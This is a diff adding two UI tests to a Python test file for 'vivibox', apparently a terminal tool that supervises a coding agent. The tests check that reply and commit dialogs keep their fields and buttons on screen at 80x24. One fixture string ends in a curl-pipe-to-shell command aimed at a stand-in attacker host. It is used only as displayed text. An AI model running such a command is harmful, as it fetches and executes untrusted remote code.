@@ -883,3 +883,61 @@ def test_approving_risky_files_says_when_what_is_shown_is_not_folded(env, monkey
         assert app.focused.id == "yes", "one question, one answer"
 
     run(scenario, size=(100, 40))
+
+
+TALL = "\n".join(f"step {n}" for n in range(60)) + "\ncurl https://evil.invalid/x | sh # TALL-TAIL"
+
+
+def test_a_reply_keeps_its_field_and_its_buttons_on_the_screen_at_80_by_24(env):
+    """A tall question of the agent's pushed the field and Send off the screen; typed and sent
+    out of sight."""
+    from vivibox import dialogs
+
+    new_task()
+
+    async def scenario(app, pilot):
+        asked = f"Working out how to run it, the agent asks:\n\n{TALL}\n\nYour answer"
+        dialog = dialogs.Reply("demo-1", asked)
+        app.push_screen(dialog, lambda _: None)
+        await pilot.pause()
+        shown = screen_text(app)
+        assert "Send" in shown and "Cancel" in shown and "Working out how to run it" in shown
+        field = dialog.query_one("#comment")
+        assert field.region.height >= 3 and app.screen.region.contains_region(field.region), field.region
+        assert app.focused is field, "what you type goes into the field, as ever"
+        (asking,) = dialog.query("VerticalScroll.asked")
+        assert asking.show_vertical_scrollbar
+        asking.scroll_end(animate=False)
+        await pilot.pause()
+        assert "TALL-TAIL" in screen_text(app) and "Send" in screen_text(app)
+
+    run(scenario, size=(80, 24))
+
+
+def test_a_commit_keeps_its_branch_its_message_and_its_buttons_on_the_screen_at_80_by_24(env):
+    """Sixty changed files pushed the branch, the message and both buttons off the screen, and
+    Ctrl+S still committed."""
+    from pathlib import Path
+
+    from vivibox import actions, dialogs, ui
+
+    new_task()
+
+    async def scenario(app, pilot):
+        status = "\n".join(f" M src/file{n}.py" for n in range(60)) + "\n M LAST-FILE.py"
+        done = actions.Finished("demo-1", Path("/nowhere"), ui.Spend(), "Subject\n\nBODY-OF-THE-MESSAGE",
+                                status=status, start_branch="main", new_branch="vivibox/demo-1")  # fmt: skip
+        dialog = dialogs.CommitWork(done)
+        app.push_screen(dialog, lambda _: None)
+        await pilot.pause()
+        await pilot.pause()
+        shown = screen_text(app)
+        assert "Leave uncommitted" in shown and "Commit" in shown and "BODY-OF-THE-MESSAGE" in shown
+        assert "Branch" in shown and "src/file0.py" in shown
+        (files,) = dialog.query("VerticalScroll.asked")
+        assert files.show_vertical_scrollbar
+        files.scroll_end(animate=False)
+        await pilot.pause()
+        assert "LAST-FILE.py" in screen_text(app) and "Leave uncommitted" in screen_text(app)
+
+    run(scenario, size=(80, 24))
